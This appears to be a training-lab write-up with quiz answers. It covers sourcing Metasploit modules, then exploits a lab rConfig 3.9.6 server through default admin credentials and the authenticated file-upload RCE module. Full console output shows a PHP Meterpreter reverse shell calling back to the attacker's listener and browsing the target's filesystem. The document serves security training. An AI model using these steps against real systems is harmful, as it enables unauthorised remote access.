# Infiltrating Unix/Linux
## Search For an Exploit Module
There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their [repos on github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). We can copy the code installed from Github into a file and save it in `/usr/share/metasploit-framework/modules/exploits/<path>` similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the commands apt update; apt install metasploit-framework or your local package manager.

## Questions
1. What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce? **Answer: PHP**
2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system. **Answer: edgerouter-isp**
   - Start the nmap scan, found open web services:
        ```
        $ sudo nmap -sV 10.129.48.85
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-24 00:33 CDT
        Nmap scan report for 10.129.48.85
        Host is up (0.24s latency).
        Not shown: 994 closed tcp ports (reset)
        PORT     STATE SERVICE  VERSION
        21/tcp   open  ftp      vsftpd 2.0.8 or later
        22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
        80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
        111/tcp  open  rpcbind  2-4 (RPC #100000)
        443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
        3306/tcp open  mysql    MySQL (unauthorized)
        ```
    - Try to visit https://10.129.48.85 and login using the credentials `admin`:`admin` and successfully logged in.
    - Use msfconsole with this module `linux/http/rconfig_vendors_auth_file_upload_rce` and set the required options:
        ```
        exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> options

        Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):

        Name       Current Setting  Required  Description
        ----       ---------------  --------  -----------
        PASSWORD   admin            yes       Password of the admin account
        Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
        RHOSTS     10.129.48.85     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
        RPORT      443              yes       The target port (TCP)
        SSL        true             no        Negotiate SSL/TLS for outgoing connections
        SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
        TARGETURI  /                yes       The base path of the rConfig server
        URIPATH                     no        The URI to use for this exploit (default is random)
        USERNAME   admin            yes       Username of the admin account
        VHOST                       no        HTTP server virtual host


        When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

        Name     Current Setting  Required  Description
        ----     ---------------  --------  -----------
        SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
        SRVPORT  8080             yes       The local port to listen on.


        Payload options (php/meterpreter/reverse_tcp):

        Name   Current Setting  Required  Description
        ----   ---------------  --------  -----------
        LHOST  10.10.14.147     yes       The listen address (an interface may be specified)
        LPORT  4444             yes       The listen port


        Exploit target:

        Id  Name
        --  ----
        0   rConfig <= 3.9.6



        View the full module info with the info, or info -d command.

        [msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> exploit
        [*] Started reverse TCP handler on 10.10.14.147:4444 
        [*] Running automatic check ("set AutoCheck false" to disable)
        [+] 3.9.6 of rConfig found !
        [+] The target appears to be vulnerable. Vulnerable version of rConfig found !
        [+] We successfully logged in !
        [*] Uploading file 'vfcjkhelry.php' containing the payload...
        [*] Triggering the payload ...
        [*] Sending stage (40004 bytes) to 10.129.48.85
        [+] Deleted vfcjkhelry.php
        [*] Meterpreter session 1 opened (10.10.14.147:4444 -> 10.129.48.85:60924) at 2025-09-24 00:42:26 -0500

        (Meterpreter 1)(/home/rconfig/www/images/vendor) > cd /
        (Meterpreter 1)(/) > ls
        Listing: /
        ==========

        Mode              Size   Type  Last modified              Name
        ----              ----   ----  -------------              ----
        040555/r-xr-xr-x  53248  dir   2021-09-24 14:37:06 -0500  bin
        040555/r-xr-xr-x  4096   dir   2021-09-24 14:42:55 -0500  boot
        040755/rwxr-xr-x  3120   dir   2025-09-24 00:28:21 -0500  dev
        040755/rwxr-xr-x  56     dir   2021-10-18 16:28:04 -0500  devicedetails
        040755/rwxr-xr-x  8192   dir   2025-09-24 00:28:23 -0500  etc
        040755/rwxr-xr-x  84     dir   2021-09-24 14:44:24 -0500  home
        040555/r-xr-xr-x  4096   dir   2021-09-24 14:35:08 -0500  lib
        040555/r-xr-xr-x  86016  dir   2021-09-24 14:37:11 -0500  lib64
        040755/rwxr-xr-x  6      dir   2018-04-10 23:59:55 -0500  media
        040755/rwxr-xr-x  6      dir   2018-04-10 23:59:55 -0500  mnt
        040755/rwxr-xr-x  16     dir   2021-09-24 14:17:05 -0500  opt
        040555/r-xr-xr-x  0      dir   2025-09-24 00:28:13 -0500  proc
        040550/r-xr-x---  278    dir   2021-10-18 20:31:55 -0500  root
        040755/rwxr-xr-x  1300   dir   2025-09-24 00:28:31 -0500  run
        040555/r-xr-xr-x  20480  dir   2021-09-24 14:35:18 -0500  sbin
        040755/rwxr-xr-x  6      dir   2018-04-10 23:59:55 -0500  srv
        040555/r-xr-xr-x  0      dir   2025-09-24 00:28:14 -0500  sys
        041777/rwxrwxrwx  6      dir   2025-09-24 00:42:22 -0500  tmp
        040755/rwxr-xr-x  155    dir   2021-09-24 14:13:04 -0500  usr
        040755/rwxr-xr-x  4096   dir   2021-09-24 14:29:26 -0500  var

        (Meterpreter 1)(/) > cd devicedetails
        (Meterpreter 1)(/devicedetails) > ls
        Listing: /devicedetails
        =======================

        Mode              Size  Type  Last modified              Name
        ----              ----  ----  -------------              ----
        100644/rw-r--r--  568   fil   2021-10-18 16:23:40 -0500  edgerouter-isp.yml
        100644/rw-r--r--  179   fil   2021-10-18 16:28:03 -0500  hostnameinfo.txt

        (Meterpreter 1)(/devicedetails) > cat hostnameinfo.txt
        Note: 

        All yaml (.yml) files should be named after the hostname of the router or switch they will configure. We discussed this in our meeting back in January. Ask Bob about it. 
        (Meterpreter 1)(/devicedetails) > cat edgerouter-isp.yml
        me: configure top level configuration
        cisco.ios.ios_config:
            lines: hostname edgerouter-isp

        - name: configure interface settings
        cisco.ios.ios_config:
            lines:
            - description test interface
            - ip address 192.168.0.10 255.255.255.0
            parents: interface gigabitethernet0/0

        - name: configure ip helpers on multiple interfaces
        cisco.ios.ios_config:
            lines:
            - ip helper-address 10.10.10.15
            - ip helper-address 10.10.11.12
            parents: '{{ item }}'
        with_items:
        - interface Ethernet1
        - interface Ethernet2
        - interface GigabitEthernet1
        ```